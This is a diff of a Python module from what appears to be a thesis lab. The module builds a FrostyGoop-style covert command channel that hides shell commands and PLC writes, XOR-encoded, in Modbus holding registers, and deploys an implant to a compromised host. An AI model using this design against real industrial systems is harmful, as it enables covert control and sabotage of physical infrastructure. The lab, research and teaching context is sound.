@@ -1,41 +1,5 @@
 #!/usr/bin/env python3
-"""
-C2 encubierto sobre Modbus TCP — estilo FrostyGoop (S1165).
-
-Implementa un canal de Command & Control que usa un PLC OpenPLC del
-laboratorio como «buzón» (storage covert channel): el operador escribe
-comandos codificados en holding registers con FC=16, y un implante
-desplegado en la máquina comprometida los lee con FC=3, ejecuta la
-orden y publica la respuesta en otro rango de registros. Todo el
-tráfico es Modbus TCP sintácticamente válido — invisible a reglas
-Snort/DPI estándar.
-
-Referentes reales:
-  - FrostyGoop (S1165, 2024): Modbus TCP como canal de C2 contra
-    infraestructura de calefacción en Lviv, Ucrania.
-  - INCONTROLLER/PIPEDREAM (S1045, 2022): C2 sobre Modbus, CODESYS,
-    OPC-UA y HTTP/HTTPS contra PLCs industriales.
-
-MITRE ATT&CK for ICS:
-  - T0869 Standard Application Layer Protocol (C2 vía protocolo legítimo)
-  - T0807 Command-Line Interface
-  - T0855 Unauthorized Command Message
-  - T0836 Modify Parameter
-  - T0882 Theft of Operational Information
-
-Arquitectura:
-  ┌────────────┐   FC=16 (write)   ┌────────────┐   FC=3 (read)    ┌─────────────┐
-  │  OPERADOR  │ ─────────────────>│ PLC-BUZÓN  │<──────────────── │  IMPLANTE   │
-  │ (kali_nodo)│   regs 1000-1105  │ plc_agua_2 │  regs 1000-1105 │(srv_empresa)│
-  │            │                   │192.168.10.11│                  │             │
-  │            │   FC=3 (read)     │  puerto 502 │  FC=16 (write)  │             │
-  │            │ <─────────────────│             │─────────────────>│             │
-  │            │   regs 1200-1324  │             │  regs 1200-1324 │             │
-  └────────────┘                   └────────────┘                  └─────────────┘
-
-Pensado para ejecutarse DENTRO del contenedor kali_nodo del laboratorio.
-Alcance: SOLO IPs de laboratorio (core/runner.assert_lab_target).
-"""
+"""C2 encubierto sobre Modbus TCP (ver TFM.pdf, sección "C2 FrostyGoop")."""
 
 import os
 import struct
@@ -44,39 +8,33 @@ import time
 import config
 from core import runner, evidence
 
-# ---------------------------------------------------------------------------
-# Protocolo de registros
-# ---------------------------------------------------------------------------
-# Zona de comandos (operador -> implante): registros CMD_BASE .. CMD_BASE+105
-# Zona de respuestas (implante -> operador): registros RSP_BASE .. RSP_BASE+124
+# Dos zonas de holding registers en el PLC-buzón:
+#   CMD_BASE..CMD_BASE+105  — operador escribe, implante lee
+#   RSP_BASE..RSP_BASE+124  — implante escribe, operador lee
 CMD_BASE = config.C2_CMD_BASE_REG   # 1000
 RSP_BASE = config.C2_RSP_BASE_REG   # 1200
 
-# Offsets dentro de la zona de comandos
-OFF_MAGIC       = 0    # 0xC2C2 = comando pendiente
-OFF_SEQ         = 1    # número de secuencia
-OFF_OPCODE      = 2    # 1=shell, 2=write_coil, 3=write_reg, 4=s7_write, 0xFF=exit
-OFF_PARAM1      = 3    # parámetro contextual (data_address, etc.)
-OFF_PARAM2      = 4    # segundo parámetro (valor, etc.)
-OFF_PAYLOAD_LEN = 5    # longitud del payload en bytes
-OFF_PAYLOAD     = 6    # inicio del payload (hasta 100 registros = 200 bytes)
-CMD_HEADER_LEN  = 6    # registros de cabecera
-CMD_PAYLOAD_MAX = 100  # registros de payload
+OFF_MAGIC       = 0
+OFF_SEQ         = 1
+OFF_OPCODE      = 2
+OFF_PARAM1      = 3
+OFF_PARAM2      = 4
+OFF_PAYLOAD_LEN = 5
+OFF_PAYLOAD     = 6
+CMD_HEADER_LEN  = 6
+CMD_PAYLOAD_MAX = 100
 
-# Offsets dentro de la zona de respuestas
-ROFF_MAGIC       = 0   # 0xD1D1 = respuesta lista
-ROFF_SEQ_ECHO    = 1   # eco del seq del comando procesado
-ROFF_STATUS      = 2   # 0=OK, 1=error
-ROFF_PAYLOAD_LEN = 3   # longitud de la respuesta en bytes
-ROFF_PAYLOAD     = 4   # inicio del payload respuesta (hasta 121 registros = 242 bytes)
+ROFF_MAGIC       = 0
+ROFF_SEQ_ECHO    = 1
+ROFF_STATUS      = 2
+ROFF_PAYLOAD_LEN = 3
+ROFF_PAYLOAD     = 4
 RSP_HEADER_LEN   = 4
 RSP_PAYLOAD_MAX  = 121
 
-# Magics
-MAGIC_CMD = 0xC2C2
-MAGIC_RSP = 0xD1D1
+MAGIC_CMD = 0xC2C2  # "comando pendiente"
+MAGIC_RSP = 0xD1D1  # "respuesta lista"
 
-# Opcodes
 OP_SHELL         = 0x01
 OP_WRITE_COIL    = 0x02
 OP_WRITE_REG     = 0x03
@@ -90,12 +48,8 @@ OPCODE_NAMES = {
 }
 
 
-# ---------------------------------------------------------------------------
-# Codificación / decodificación de payload
-# ---------------------------------------------------------------------------
-
 def _xor_bytes(data, key):
-    """Aplica XOR cíclico con la clave precompartida (bytes)."""
+    """XOR cíclico con la clave precompartida (bytes)."""
     if not key:
         return data
     out = bytearray(len(data))
@@ -106,14 +60,7 @@ def _xor_bytes(data, key):
 
 
 def encode_payload(text, xor_key=None):
-    """Codifica un string en una lista de registros Modbus (16-bit unsigned).
-
-    El texto se codifica en UTF-8, se aplica XOR si se pasa clave, y se
-    empaqueta en registros big-endian (2 bytes/registro). Si la longitud
-    en bytes es impar, se añade un byte de relleno 0x00 al final.
-
-    Devuelve (registers_list, byte_length).
-    """
+    """UTF-8 -> XOR -> registros big-endian (2 bytes/reg). Devuelve (regs, byte_len)."""
     raw = text.encode("utf-8", errors="replace")
     if len(raw) > CMD_PAYLOAD_MAX * 2:
         raw = raw[:CMD_PAYLOAD_MAX * 2]
@@ -129,10 +76,7 @@ def encode_payload(text, xor_key=None):
 
 
 def decode_payload(registers, byte_length, xor_key=None):
-    """Decodifica una lista de registros Modbus a un string UTF-8.
-
-    Deshace la operación de encode_payload.
-    """
+    """Inverso de encode_payload."""
     raw = b""
     for r in registers:
         raw += struct.pack(">H", r)
@@ -141,10 +85,6 @@ def decode_payload(registers, byte_length, xor_key=None):
     raw = _xor_bytes(raw, xor_key_bytes)
     return raw.decode("utf-8", errors="replace")
 
-
-# ---------------------------------------------------------------------------
-# Implementación in-process (la ejecuta el subproceso _cli)
-# ---------------------------------------------------------------------------
 
 def _mb_write_registers(client, address, values, uid=1):
     """write_registers compatible con pymodbus 3.x (device_id / slave / unit)."""
@@ -400,10 +340,6 @@ def _do_deploy_implant(implant_host, ssh_key_path, mailbox_ip, mailbox_port,
     return True
 
 
-# ---------------------------------------------------------------------------
-# Funciones públicas (dashboard) — siguen el patrón de openplc_rce.py
-# ---------------------------------------------------------------------------
-
 def _launch_cli(action, args, path, sink):
     """Lanza el subproceso CLI envuelto con proxychains si procede.
 
@@ -419,7 +355,12 @@ def _launch_cli(action, args, path, sink):
 
 def deploy_implant(implant_host=None, sink=None):
     """Despliega el implante C2 en el host comprometido (T0869, T1570)."""
-    host = implant_host or config.SAMBA_HOST
+    if implant_host:
+        host = implant_host
+    elif config.get_mode() == "control":
+        host = config.SAMBA_HOST_CONTROL
+    else:
+        host = config.SAMBA_HOST
     runner.assert_lab_target(host)
     path = evidence.new_evidence_file("c2_modbus", "deploy_implant")
     evidence.header(
